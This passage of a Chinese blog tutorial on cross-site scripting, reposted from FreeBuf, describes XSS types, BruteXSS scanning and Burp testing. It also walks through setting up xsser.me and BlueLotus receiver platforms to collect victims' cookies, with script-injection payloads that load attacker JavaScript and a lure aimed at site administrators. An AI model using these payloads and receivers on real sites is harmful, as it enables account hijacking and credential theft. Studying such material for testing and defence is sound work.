<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/8.jpg" alt=""><br>DOM-XSS 的数据流向是：<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">URL</code> →<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code> </noscript></p><p></p>
<p></p><h4 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.2em;">总结</h4><p></p>
<p></p><p style="margin:1.2em 0px;">在易用上，存储型XSS &gt; DOM &#8211; XSS &gt; 反射型 XSS。</p><p></p>
<p></p><p style="margin:1.2em 0px;">注：反射型xss和dom-xss都需要在数据包中加入js代码才能够触发。</p><p></p>
<p></p><h3 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.3em;">漏洞利用</h3><p></p>
<p></p><p style="margin:1.2em 0px;">通过 XSS 来获得用户 Cookie 或其他有用信息，利用平台负责接收并保存这些信息。XSS利用平台有很多种如XSS Shell, BeEF, Anehta, CAL9000。<br>进入搭建好的xsser.me平台首页输入用户名与密码进行登录<br>成功之后会显示主界面，左边是模块列表，右边是项目列表：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/9.jpg" alt=""><br>我们点击左边“我的项目”旁边的“创建”按钮：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/10.jpg" alt=""><br>名称和描述可以随便取，不影响使用。输入时候点击“下一步”按钮。之后会出现“配置代码”界面：<br>1<a href="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/11.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"></a><br>点击下一步、就会看到这个项目的一些信息<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/11.jpg" alt=""><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/12.jpg" alt=""><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/13.jpg" alt=""><br>点击完成。然后我们会在首页看到我们的新项目，点击这个项目：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/14.jpg" alt=""><br>之后点击项目，进入一个页面再点击右上方的查看代码<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/15.jpg" alt=""><br>就可以看到使用方法：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/16.jpg" alt=""><br>下面就演示下怎么利用<br>把<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">&lt;script data-original=”…” src=”<a href="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif&quot;&gt;&lt;/script" target="_blank" rel="noopener">http://www.freebuf.com/buf/themes/freebuf/images/grey.gif&quot;&gt;&lt;/script</a>&gt;</code>注入到反射型 XSS 的演示页面中。</p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/9.jpg" alt=""><br>我们点击左边“我的项目”旁边的“创建”按钮：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/10.jpg" alt=""><br>名称和描述可以随便取，不影响使用。输入时候点击“下一步”按钮。之后会出现“配置代码”界面：<br>1<a href="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/11.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"></a><br>点击下一步、就会看到这个项目的一些信息<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/11.jpg" alt=""><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/12.jpg" alt=""><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/13.jpg" alt=""><br>点击完成。然后我们会在首页看到我们的新项目，点击这个项目：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/14.jpg" alt=""><br>之后点击项目，进入一个页面再点击右上方的查看代码<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/15.jpg" alt=""><br>就可以看到使用方法：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/16.jpg" alt=""><br>下面就演示下怎么利用<br>把<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">&lt;script src=”…”&gt;&lt;/script&gt;</code>注入到反射型 XSS 的演示页面中。</noscript></p><br><p></p>
<p></p><p style="margin:1.2em 0px;"><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/17.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/17.jpg" alt=""></noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">上面的src=”xxxx”是我另外创建的一个项目的地址，把你创建好的那个项目，提供的那个地址放进去，就可以了，虽然这个页面没反应，但是xsser.me那个项目就收到消息了。</p><p></p>
<p></p><p style="margin:1.2em 0px;"><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/18.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/18.jpg" alt=""></noscript></p><p></p>
<p></p><h3 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.3em;">测试方法</h3><p></p>
<p></p><h4 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.2em;">工具测试</h4><p></p>
<p></p><p style="margin:1.2em 0px;">工具方面主要介绍brutexss，工具简单但效果非常好，也可以加入自己累积的测试语句和绕过语句<br>BruteXSS是一个非常强大和快速的跨站点脚本暴力注入。它用于暴力注入一个参数。该BruteXSS从指定的词库加载多种有效载荷进行注入并且使用指定的载荷和扫描检查这些参数很容易受到XSS漏洞。得益于非常强大的扫描功能。在执行任务时， BruteXSS是非常准确而且极少误报。 BruteXSS支持POST和GET请求，适应现代Web应用程序。<br>开始界面</p><p></p>
<p></p><p style="margin:1.2em 0px;"><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/19.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/19.jpg" alt=""></noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">选择相应的数据提交方法，并输入测试的链接及相对就的参数<br><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/20.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/20.jpg" alt=""></noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">接下来选择测试payload 就可以开始测试了，自动进行测试，并会输出对应漏洞内容；<br><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/21.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/21.jpg" alt=""></noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">Payload可以自己去完善是这个工具的一大亮点</p><p></p>
<p></p><p style="margin:1.2em 0px;"><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/22.jpg" alt=""><br><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/23.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/22.jpg" alt=""><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/23.jpg" alt=""></noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">在以后的日子中发现了那种绕过的方法是工具中没有的只要把payload加入到列表中就可以了。</p><p></p>
<p></p><h4 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.2em;">手工测试</h4><p></p>
<p></p><p style="margin:1.2em 0px;">手工测试是一个复杂的过程，我们要针对页面返回的内容去构造，这个过程我们要用到神器burpsuit了，利用工具，我们来截断数据包进行对比分析吧。<br>页面的效果是这样的</p><p></p>
<p></p><p style="margin:1.2em 0px;"><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/24.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/24.jpg" alt=""></noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">他的实际内容是这样的<br><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/25.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/25.jpg" alt=""></noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">我们手工就是要根据返回的内容去进行修改，如果对方闭合了<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">〈〉</code>或<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">‘‘</code>等符号我们要在里面进行修改，亦或是对方对语句中的某个点进行了限制，我们要进行绕过测试，找到他们禁用的值，这样我们才可以完成整个攻击行为。</p><p></p>
<p></p><h3 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.3em;">危害</h3><p></p>
<p></p><p style="margin:1.2em 0px;">由于能够在生成的 Web 页面中注入代码，能想到的威胁有多么严重，就可以有多么严重的威胁。攻击者可以使用 XSS 漏洞窃取 Cookie，劫持帐户，执行 ActiveX，执行 Flash 内容，强迫您下载软件，或者是对硬盘和数据采取操作。<br>只要您点击了某些 URL，这一切便有可能发生。每天之中，在阅读来自留言板或新闻组的受信任的电子邮件的时侯，您会多少次地单击其中的 URL？<br>网络钓鱼攻击通常利用 XSS 漏洞来装扮成合法站点。可以看到很多这样的情况，比如您的银行给你发来了一封电子邮件，向您告知对您的帐户进行了一些修改并诱使您点击某些超链接。如果仔细观察这些 URL，它们实际上可能利用了银行网站中存在的漏洞，它们的形式类似于 <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);"><a href="http://mybank.com/somepage?redirect=&lt;script&gt;alert(‘XSS’)&lt;/script" target="_blank" rel="noopener">http://mybank.com/somepage?redirect=&lt;script&gt;alert(‘XSS’)&lt;/script</a>&gt;</code>，这里利用了“redirect”参数来执行攻击。<br>如果您足够狡猾的话，可以将管理员定为攻击目标，您可以发送一封具有如下主题的邮件：“求救！这个网站地址总是出现错误！”在管理员打开该 URL 后，便可以执行许多恶意操作，例如窃取他（或她）的凭证。<br>好了，现在我们已经理解了它的危害性 — 危害用户，危害管理员，给公司带来坏的公共形象。</p><p></p>
<ul>
<li><h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h3><p>  搭建蓝莲花团队的开源xss平台</p>
</li>
</ul>
<p>1.下载源码 <a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
<p>下载之后解压缩到www目录</p>
<p>2.访问网站点击安装</p>
<p>3.访问<a href="http://xxxxxx/admin.php进入xss平台后台页面" target="_blank" rel="noopener">http://xxxxxx/admin.php进入xss平台后台页面</a></p>
<p>公共模板包含有常见的js代码</p>
<p>在 “我的js”模块中，可以根据上面的模板生成自己的xss payload<br>点击 生成payload，左侧是payload，右侧可以对payload进行转码</p>
<p>也可以将生成的js代码按如下格式插入到存在xss漏洞的地方 <script src="js_url"></script> &lt;img src=x onerror=appendChild(createElement(‘script’)).src=’js_url’ /&gt; 根据xss漏洞的具体情况，修改左侧的代码，payload执行成功之后在接收面板里就会看到结果。</p>
<p>原载：</p>
<p><a href="http://www.freebuf.com/column/155799.html" target="_blank" rel="noopener">http://www.freebuf.com/column/155799.html</a></p>
<p><a href="https://blog.csdn.net/wst0717/article/details/81571444" target="_blank" rel="noopener">https://blog.csdn.net/wst0717/article/details/81571444</a></p>
<p>​      </p>

  	
  
</div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/10/19/xss跨脚本漏洞/" data-id="cjnfwh1xf00020gvgiu8egbkp" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2018/10/17/注入学习/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇</strong>
      <div class="article-nav-title">注入学习</div>
    </a>
  
</nav>

  
</article>



</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">黑色褪去，呼唤君之名</h1>
    <h2 class="blog-subtitle">她的眼睛会笑</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1539771691520&amp;di=e0fc0ad09fb5dc783368f8fa3d5a109b&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.touxiang.cn%2Fuploads%2F20120916%2F16-015401_11.jpg">
    <h2 class="author">拜咯</h2>
    <h3 class="description">小小白</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="https://github.com/13bailo" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2017 - 2018 拜咯<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
  <script src="/plugin/galmenu/GalMenu.js"></script>
  <div class="GalMenu GalDropDown">
      <div class="circle" id="gal">
        <div class="ring">
          
            <a href="/" title="" class="menuItem">首页</a>
          
            <a href="/tags" title="" class="menuItem">标签</a>
          
            <a href="/categories" title="" class="menuItem">分类</a>
          
            <a href="/archives" title="" class="menuItem">归档</a>
          
            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
          
            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
          
        </div>
        
          <audio id="audio" src="#"></audio>
        
      </div> 
</div>
<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
    for (var i = 0,
    l = items.length; i < l; i++) {
      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
    }</script>
<script type="text/javascript">
  $(document).ready(function() {
    $('body').GalMenu({
      'menu': 'GalDropDown'
    })
  });
</script>

  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>